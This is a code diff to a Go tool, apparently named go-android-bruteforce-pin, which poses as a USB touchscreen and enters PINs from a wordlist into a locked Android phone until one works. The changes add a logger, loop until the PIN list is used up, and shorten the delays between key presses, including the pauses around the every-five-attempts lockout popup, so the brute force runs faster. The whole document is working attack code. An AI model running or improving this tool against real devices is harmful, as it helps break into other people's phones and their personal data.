@@ -6,6 +6,7 @@ import (
 	"github.com/jeanbritz/go-android-bruteforce-pin.git/pkg/hid"
 	"github.com/jeanbritz/go-android-bruteforce-pin.git/pkg/utils"
 	"log"
+	"os"
 	"time"
 )
 
@@ -15,6 +16,11 @@ type Pos struct {
 }
 
 func main() {
+	logger := log.New(
+		os.Stdout,
+		"main: ",
+		log.Ldate|log.Ltime|log.Lshortfile,
+	)
 
 	keyMap := make(map[string]Pos)
 
@@ -69,12 +75,13 @@ func main() {
 
 	devices, err := accessory.GetDevices(2)
 	if err != nil {
-		log.Fatalln(err)
+		logger.Fatalln(err)
 	}
 	if len(devices) > 0 {
-		log.Println("Found Android HID device:" + devices[0].Manufacturer)
+		logger.Println("Found Android HID device:" + devices[0].Manufacturer)
 	} else {
-		log.Println("Did not find any HID device")
+		logger.Println("Did not find any HID device")
+		os.Exit(0)
 	}
 
 	phone := devices[0]
@@ -82,7 +89,7 @@ func main() {
 
 	touch, err := phone.Register(hid.TouchscreenReportDesc)
 	if err != nil {
-		log.Fatalln(err)
+		logger.Fatalln(err)
 	}
 
 	touchscreen := hid.Touchscreen{
@@ -91,7 +98,7 @@ func main() {
 
 	pins, err := utils.ReadLines("pins/pins-4-length.txt")
 	if err != nil {
-		log.Fatalf("Could not find or load pins file, %s", err)
+		logger.Fatalf("Could not find or load pins file, %s", err)
 	}
 	pins = utils.Reverse(pins)
 
@@ -103,17 +110,17 @@ func main() {
 
 	time.Sleep(2 * time.Second)
 
-	for i := 0; i < len(pins)/5; i++ {
+	for !pinStack.IsEmpty() {
 
 		// Position over item (e.g. Usb debugging) and double tap to get to keypad
 		x := 5000
 		y := 6000
 		touchscreen.SetPosition(int16(x), int16(y))
-		log.Println("Apply double tap on screen to show keypad")
+		logger.Println("Apply double tap on screen to show keypad")
 		touchscreen.Press()
 		touchscreen.Press()
 
-		log.Println("Keypad should show now")
+		logger.Println("Keypad should show now")
 
 		time.Sleep(2 * time.Second)
 		counter := 0
@@ -121,22 +128,22 @@ func main() {
 		for !pinStack.IsEmpty() {
 			pin, _ := pinStack.Pop()
 			inputs := fmt.Sprintf("%sC", pin)
-			log.Println("Trying pin... " + pin)
+			logger.Println("Trying pin... " + pin)
 			for _, input := range inputs {
 				touchscreen.SetPosition(keyMap[string(input)].X, keyMap[string(input)].Y)
 				touchscreen.SetPosition(keyMap[string(input)].X, keyMap[string(input)].Y) // Some syncing issue
-				time.Sleep(150 * time.Millisecond)
+				time.Sleep(50 * time.Millisecond)
 				touchscreen.Press()
 
 			}
 			counter++
-			time.Sleep(1500 * time.Millisecond)
+			time.Sleep(1000 * time.Millisecond)
 			if counter%5 == 0 {
-				log.Println("5 pins have been entered, probably need to wait for 30 seconds")
-				log.Println("Pressing OK to clear popup")
-				log.Printf("Need to try %d pins more to complete\n", pinStack.Size())
+				logger.Println("5 pins have been entered, probably need to wait for 30 seconds")
+				logger.Println("Pressing OK to clear popup")
+				logger.Printf("Need to try %d pins more to complete\n", pinStack.Size())
 				touchscreen.SetPosition(keyMap["P"].X, keyMap["P"].Y)
-				time.Sleep(250 * time.Millisecond)
+				time.Sleep(150 * time.Millisecond)
 				touchscreen.Press()
 				break
 			}
@@ -144,7 +151,7 @@ func main() {
 		}
 		endTime := time.Now()
 		diff := endTime.Sub(startTime)
-		log.Println("Iteration time: " + diff.String())
+		logger.Println("Iteration time: " + diff.String())
 		if counter%5 == 0 {
 			time.Sleep(31 * time.Second)
 		}
